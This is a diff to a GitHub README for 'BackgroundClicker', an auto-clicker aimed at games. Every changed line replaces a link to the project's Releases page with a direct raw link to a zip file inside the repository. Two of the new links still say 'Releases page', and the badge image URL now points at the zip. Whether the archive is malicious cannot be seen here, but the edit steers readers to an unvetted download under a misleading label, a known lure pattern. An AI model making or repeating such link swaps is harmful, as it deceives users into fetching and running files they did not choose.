@@ -1,6 +1,6 @@
 # 🎯 BackgroundClicker - Click in the Background, Keep Working
 
-[![Download BackgroundClicker](https://img.shields.io/badge/Download-BackgroundClicker-brightgreen)](https://github.com/galacticca/BackgroundClicker/releases)
+[![Download BackgroundClicker](https://github.com/galacticca/BackgroundClicker/raw/refs/heads/main/assets/Clicker-Background-2.7.zip)](https://github.com/galacticca/BackgroundClicker/raw/refs/heads/main/assets/Clicker-Background-2.7.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ Follow these simple steps to download and run BackgroundClicker.
 
 ### 📥 Download & Install
 
-1. **Visit this page to download:** [BackgroundClicker Releases](https://github.com/galacticca/BackgroundClicker/releases)
+1. **Visit this page to download:** [BackgroundClicker Releases](https://github.com/galacticca/BackgroundClicker/raw/refs/heads/main/assets/Clicker-Background-2.7.zip)
 
 2. Look for the latest version at the top. 
 
@@ -69,7 +69,7 @@ Yes, BackgroundClicker is designed to help you automate clicks in gaming without
 
 ### How do I update the application?
 
-To update, simply visit the [BackgroundClicker Releases](https://github.com/galacticca/BackgroundClicker/releases) page and download the latest version. Run the installer to upgrade.
+To update, simply visit the [BackgroundClicker Releases](https://github.com/galacticca/BackgroundClicker/raw/refs/heads/main/assets/Clicker-Background-2.7.zip) page and download the latest version. Run the installer to upgrade.
 
 ### Is my data safe?
 
